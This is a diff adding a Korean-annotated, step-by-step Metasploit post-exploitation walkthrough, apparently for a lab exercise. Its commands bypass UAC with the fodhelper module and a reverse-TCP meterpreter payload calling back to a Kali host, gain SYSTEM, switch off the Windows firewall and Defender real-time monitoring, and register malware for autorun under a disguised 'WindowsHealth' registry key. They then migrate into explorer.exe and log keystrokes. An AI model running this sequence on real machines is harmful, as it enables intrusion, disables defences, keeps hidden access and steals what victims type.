@@ -1,0 +1,45 @@
+[1단계: 권한 상승 (UAC 우회)]
+background (현재 연결된 세션을 백그라운드로 보냄)
+
+use exploit/windows/local/bypassuac_fodhelper (UAC 우회 공격 모듈 선택)
+
+set SESSION [1] (방금 백그라운드로 보낸 세션 ID 입력, sessions 명령어로 확인 가능)
+
+set PAYLOAD windows/x64/meterpreter/reverse_tcp (64비트 페이로드로 변경)
+
+set LHOST [172.16.10.156] (본인 칼리 IP 입력)
+
+set LPORT 4445 (기존 포트와 충돌나지 않게 4445로 변경)
+
+set TARGET 1 (타겟을 64비트 윈도우로 명시)
+
+run (공격 실행 -> 성공 시 새 세션 열림)
+
+getsystem (새로 열린 세션에서 관리자 권한 획득 -> Got SYSTEM 확인)
+
+[2단계: 방어 무력화 (방화벽 & 디펜더)]
+shell (윈도우 CMD 창으로 진입)
+
+chcp 65001 (한글 깨짐 방지 설정)
+
+netsh advfirewall set allprofiles state off (윈도우 방화벽 끄기)
+
+powershell Set-MpPreference -DisableRealtimeMonitoring $true (윈도우 디펜더 실시간 감시 끄기)
+
+[3단계: 지속성 유지 (재부팅 시 자동실행)]
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealth" /t REG_SZ /d "C:\Users\sinu\Downloads\sy.exe" /f (레지스트리에 악성코드 자동실행 등록)
+
+exit (CMD 창에서 빠져나와 Meterpreter로 복귀)
+
+[4단계: 정보 탈취 (키로깅)]
+ps (실행 중인 프로세스 목록 확인 -> explorer.exe의 PID 찾기)
+
+migrate [PID] (explorer.exe의 PID 숫자를 입력해 프로세스 이동)
+
+keyscan_start (키보드 입력 감시 시작)
+
+(이 타이밍에 피해자 PC에서 메모장에 글씨 입력)
+
+keyscan_dump (입력된 키보드 내용 확인)
+
+keyscan_stop (실습 종료 후 감시 끄기)
